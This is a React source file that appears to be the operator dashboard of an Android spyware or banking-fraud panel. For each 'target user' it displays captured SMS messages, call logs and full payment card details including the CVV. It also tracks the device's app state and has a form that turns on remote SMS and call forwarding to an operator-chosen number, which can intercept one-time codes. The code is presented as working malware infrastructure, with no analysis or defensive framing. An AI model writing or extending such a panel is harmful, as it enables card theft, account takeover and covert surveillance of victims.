import React, { useState } from 'react';
import { 
  X, User, MessageSquare, PhoneCall, CreditCard, Send, 
  Copy, Trash2, Check, Smartphone, Shield, Radio, ArrowRightLeft, Cpu
} from 'lucide-react';
import { normalizeSmsItem, normalizeCallItem, normalizeCardItem, extractCustomFields } from '../utils/smartFirebaseParser';

export default function UserDetailModal({ user, onClose, onUpdateUser }) {
  const [activeTab, setActiveTab] = useState('account');
  const [copiedId, setCopiedId] = useState(null);

  // Local state for forwarding form
  const [forwardConfig, setForwardConfig] = useState(
    user?.forwardConfig || {
      smsForwarding: false,
      callForwarding: false,
      forwardTargetNumber: '',
      selectedSimSlot: 1
    }
  );
  const [forwardSaveSuccess, setForwardSaveSuccess] = useState(false);

  if (!user) return null;

  // Smart normalized SMS logs, call logs, and card records
  const rawSmsList = user.smsLogs || user.smsDataList || user.messages || [];
  const normalizedSmsList = rawSmsList.map((item, idx) => ({ ...normalizeSmsItem(item), id: `sms_${idx}` }));

  const rawCallList = user.callLogs || user.callDataList || user.calls || [];
  const normalizedCallList = rawCallList.map((item, idx) => ({ ...normalizeCallItem(item), id: `call_${idx}` }));

  const rawCardList = user.cardData ? [user.cardData] : (user.cardDataList || user.cards || []);
  const normalizedCardList = rawCardList.map((item, idx) => ({ ...normalizeCardItem(item), id: `card_${idx}` }));

  const customFieldsMap = extractCustomFields(user);
  const customFieldsKeys = Object.keys(customFieldsMap);

  const handleCopyText = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleSaveForwarding = (e) => {
    e.preventDefault();
    const updatedUser = {
      ...user,
      forwardConfig: forwardConfig
    };
    onUpdateUser(updatedUser);
    setForwardSaveSuccess(true);
    setTimeout(() => setForwardSaveSuccess(false), 2500);
  };

  const isUserActive = user.isActive || user.isOnline;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="glass-panel modal-content" onClick={(e) => e.stopPropagation()}>
        {/* Header */}
        <div className="modal-header">
          <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
            <div className="user-avatar" style={{ width: '48px', height: '48px', fontSize: '1.2rem' }}>
              {user.fullName ? user.fullName[0] : 'U'}
            </div>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <h3 style={{ fontSize: '1.2rem', color: '#fff' }}>{user.fullName}</h3>
                <div className={`pulse-badge ${isUserActive ? 'active' : 'inactive'}`}>
                  <span className="pulse-dot"></span>
                  <span>{isUserActive ? 'Active Online' : 'Offline'}</span>
                </div>
              </div>
              <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>{user.mobileNumber} • ID: {user.userId}</p>
            </div>
          </div>

          <button className="modal-close-btn" onClick={onClose}>
            <X size={20} />
          </button>
        </div>

        {/* Navigation Tabs */}
        <div className="modal-tabs">
          <button 
            className={`tab-btn ${activeTab === 'account' ? 'active' : ''}`}
            onClick={() => setActiveTab('account')}
          >
            <User size={16} /> Account Info
          </button>
          <button 
            className={`tab-btn ${activeTab === 'sms' ? 'active' : ''}`}
            onClick={() => setActiveTab('sms')}
          >
            <MessageSquare size={16} /> SMS Messages ({normalizedSmsList.length})
          </button>
          <button 
            className={`tab-btn ${activeTab === 'calls' ? 'active' : ''}`}
            onClick={() => setActiveTab('calls')}
          >
            <PhoneCall size={16} /> Call Details ({normalizedCallList.length})
          </button>
          <button 
            className={`tab-btn ${activeTab === 'cards' ? 'active' : ''}`}
            onClick={() => setActiveTab('cards')}
          >
            <CreditCard size={16} /> Card Information ({normalizedCardList.length})
          </button>
          <button 
            className={`tab-btn ${activeTab === 'analytics' ? 'active' : ''}`}
            onClick={() => setActiveTab('analytics')}
          >
            <Cpu size={16} /> Smart Schema & Analytics ({customFieldsKeys.length})
          </button>
          <button 
            className={`tab-btn ${activeTab === 'forward' ? 'active' : ''}`}
            onClick={() => setActiveTab('forward')}
          >
            <Send size={16} /> Data Forwarding
          </button>
        </div>

        {/* Body Content */}
        <div className="modal-body">
          {/* 1. Account Info Tab */}
          {activeTab === 'account' && (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '1.25rem' }}>
              <div className="glass-panel" style={{ padding: '1.25rem' }}>
                <h4 style={{ color: '#6366f1', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <User size={18} /> Profile Overview
                </h4>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', fontSize: '0.9rem' }}>
                  <div><strong>Full Name:</strong> <span style={{ color: '#f3f4f6' }}>{user.fullName}</span></div>
                  <div><strong>Mobile Number:</strong> <span style={{ color: '#f3f4f6' }}>{user.mobileNumber}</span></div>
                  <div><strong>User ID:</strong> <span style={{ color: '#93c5fd', fontFamily: 'monospace' }}>{user.userId}</span></div>
                  <div><strong>Internal Doc ID:</strong> <span style={{ color: '#9ca3af', fontFamily: 'monospace' }}>{user.id}</span></div>
                </div>
              </div>

              <div className="glass-panel" style={{ padding: '1.25rem' }}>
                <h4 style={{ color: '#8b5cf6', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Smartphone size={18} /> Device & Status
                </h4>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', fontSize: '0.9rem' }}>
                  <div><strong>Device Model:</strong> <span style={{ color: '#f3f4f6' }}>{user.stringField || 'Android Device'}</span></div>
                  <div><strong>App Version:</strong> <span style={{ color: '#f3f4f6' }}>{user.numberField || 'v1.0'}</span></div>
                  <div><strong>Last Activity:</strong> <span style={{ color: '#f3f4f6' }}>{user.lastActivityTime}</span></div>
                  <div><strong>App State:</strong> <span style={{ color: user.appInBackground ? '#f59e0b' : '#34d399' }}>{user.appInBackground ? 'Background Process' : 'Foreground Active'}</span></div>
                </div>
              </div>
            </div>
          )}

          {/* 2. SMS Tab */}
          {activeTab === 'sms' && (
            <div>
              {normalizedSmsList.length === 0 ? (
                <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                  No SMS messages recorded for this target user.
                </div>
              ) : (
                <table className="data-table">
                  <thead>
                    <tr>
                      <th>Sender / Origin</th>
                      <th>Message Body</th>
                      <th>Timestamp</th>
                      <th>Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {normalizedSmsList.map((sms) => (
                      <tr key={sms.id}>
                        <td style={{ fontWeight: 600, color: '#93c5fd' }}>{sms.sender}</td>
                        <td style={{ maxWidth: '380px', wordBreak: 'break-word' }}>{sms.message}</td>
                        <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{sms.timestamp}</td>
                        <td>
                          <button 
                            className="btn-secondary" 
                            style={{ padding: '4px 8px' }}
                            onClick={() => handleCopyText(sms.message, sms.id)}
                            title="Copy SMS text"
                          >
                            {copiedId === sms.id ? <Check size={14} color="#34d399" /> : <Copy size={14} />}
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          )}

          {/* 3. Calls Tab */}
          {activeTab === 'calls' && (
            <div>
              {normalizedCallList.length === 0 ? (
                <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                  No call records captured.
                </div>
              ) : (
                <table className="data-table">
                  <thead>
                    <tr>
                      <th>Contact / Number</th>
                      <th>Call Type</th>
                      <th>Duration</th>
                      <th>Timestamp</th>
                    </tr>
                  </thead>
                  <tbody>
                    {normalizedCallList.map((call) => (
                      <tr key={call.id}>
                        <td>
                          <div style={{ fontWeight: 600 }}>{call.number}</div>
                        </td>
                        <td>
                          <span style={{ 
                            color: call.type.includes('IN') ? '#34d399' : '#60a5fa',
                            fontWeight: 600,
                            fontSize: '0.85rem'
                          }}>
                            {call.type}
                          </span>
                        </td>
                        <td style={{ fontFamily: 'monospace' }}>{call.duration}</td>
                        <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{call.timestamp}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          )}

          {/* 4. Card Information Tab */}
          {activeTab === 'cards' && (
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '1.5rem' }}>
              {normalizedCardList.length > 0 ? (
                normalizedCardList.map((card, i) => (
                  <React.Fragment key={i}>
                    <div className="bank-card-preview">
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <span style={{ fontWeight: 700, letterSpacing: '1px' }}>PAYMENT CARD #{i+1}</span>
                        <CreditCard size={28} />
                      </div>
                      <div className="card-number">{card.cardNumber}</div>
                      <div className="card-details">
                        <div>
                          <div style={{ fontSize: '0.65rem', opacity: 0.8 }}>Cardholder Name</div>
                          <div style={{ fontWeight: 600 }}>{card.cardHolder}</div>
                        </div>
                        <div>
                          <div style={{ fontSize: '0.65rem', opacity: 0.8 }}>Expires</div>
                          <div style={{ fontWeight: 600 }}>{card.expiry}</div>
                        </div>
                        <div>
                          <div style={{ fontSize: '0.65rem', opacity: 0.8 }}>CVV</div>
                          <div style={{ fontWeight: 600 }}>{card.cvv}</div>
                        </div>
                      </div>
                    </div>
                  </React.Fragment>
                ))
              ) : (
                <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                  No financial or payment card details associated with this target user.
                </div>
              )}
            </div>
          )}

          {/* 5. Smart Schema & Analytics Tab */}
          {activeTab === 'analytics' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
              <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(139,92,246,0.3)', background: 'rgba(139,92,246,0.05)' }}>
                <h4 style={{ color: '#c084fc', marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Cpu size={18} /> Universal Smart Data Engine Status
                </h4>
                <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>
                  Auto-detected Firestore Document Schema • Dynamically parsed field mappings for SMS, Calls, Cards, and Metadata.
                </p>
              </div>

              <div className="glass-panel" style={{ padding: '1.25rem' }}>
                <h5 style={{ color: '#fff', marginBottom: '1rem' }}>Extracted Unmapped Custom Attributes ({customFieldsKeys.length})</h5>
                {customFieldsKeys.length === 0 ? (
                  <div style={{ color: '#9ca3af', fontSize: '0.85rem' }}>All fields standardly mapped!</div>
                ) : (
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: '0.75rem' }}>
                    {customFieldsKeys.map(key => (
                      <div key={key} style={{ background: 'rgba(17,24,39,0.8)', padding: '0.65rem 0.85rem', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.05)', fontSize: '0.8rem' }}>
                        <div style={{ color: '#818cf8', fontWeight: 600, marginBottom: '2px' }}>{key}</div>
                        <div style={{ color: '#f3f4f6', wordBreak: 'break-all', fontFamily: 'monospace' }}>{customFieldsMap[key]}</div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* 5. Forwarding Data Tab */}
          {activeTab === 'forward' && (
            <form onSubmit={handleSaveForwarding} style={{ maxWidth: '540px', margin: '0 auto' }}>
              <div className="glass-panel" style={{ padding: '1.5rem', display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                <h4 style={{ color: '#6366f1', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <ArrowRightLeft size={18} /> Remote Forwarding Settings
                </h4>

                <div>
                  <label style={{ display: 'block', fontSize: '0.85rem', color: '#9ca3af', marginBottom: '6px' }}>
                    Target Forwarding Phone Number
                  </label>
                  <input
                    type="text"
                    className="search-input"
                    style={{ paddingLeft: '1rem' }}
                    placeholder="e.g. +91 99988 77766"
                    value={forwardConfig.forwardTargetNumber}
                    onChange={(e) => setForwardConfig({ ...forwardConfig, forwardTargetNumber: e.target.value })}
                  />
                </div>

                <div>
                  <label style={{ display: 'block', fontSize: '0.85rem', color: '#9ca3af', marginBottom: '6px' }}>
                    SIM Slot Selection
                  </label>
                  <div style={{ display: 'flex', gap: '1rem' }}>
                    <button
                      type="button"
                      className={`btn-secondary ${forwardConfig.selectedSimSlot === 1 ? 'btn-primary' : ''}`}
                      onClick={() => setForwardConfig({ ...forwardConfig, selectedSimSlot: 1 })}
                      style={{ flex: 1, justifyContent: 'center' }}
                    >
                      SIM 1 (Active)
                    </button>
                    <button
                      type="button"
                      className={`btn-secondary ${forwardConfig.selectedSimSlot === 2 ? 'btn-primary' : ''}`}
                      onClick={() => setForwardConfig({ ...forwardConfig, selectedSimSlot: 2 })}
                      style={{ flex: 1, justifyContent: 'center' }}
                    >
                      SIM 2
                    </button>
                  </div>
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', borderTop: '1px solid var(--border-color)', paddingTop: '1rem' }}>
                  <label style={{ display: 'flex', alignItems: 'center', gap: '10px', cursor: 'pointer' }}>
                    <input
                      type="checkbox"
                      checked={forwardConfig.smsForwarding}
                      onChange={(e) => setForwardConfig({ ...forwardConfig, smsForwarding: e.target.checked })}
                      style={{ width: '18px', height: '18px', accentColor: '#6366f1' }}
                    />
                    <span>Enable Remote SMS Forwarding</span>
                  </label>

                  <label style={{ display: 'flex', alignItems: 'center', gap: '10px', cursor: 'pointer' }}>
                    <input
                      type="checkbox"
                      checked={forwardConfig.callForwarding}
                      onChange={(e) => setForwardConfig({ ...forwardConfig, callForwarding: e.target.checked })}
                      style={{ width: '18px', height: '18px', accentColor: '#6366f1' }}
                    />
                    <span>Enable Remote Call Forwarding</span>
                  </label>
                </div>

                <button type="submit" className="btn-primary" style={{ marginTop: '0.5rem', justifyContent: 'center' }}>
                  {forwardSaveSuccess ? 'Config Saved & Synced!' : 'Apply Forward Rules'}
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}
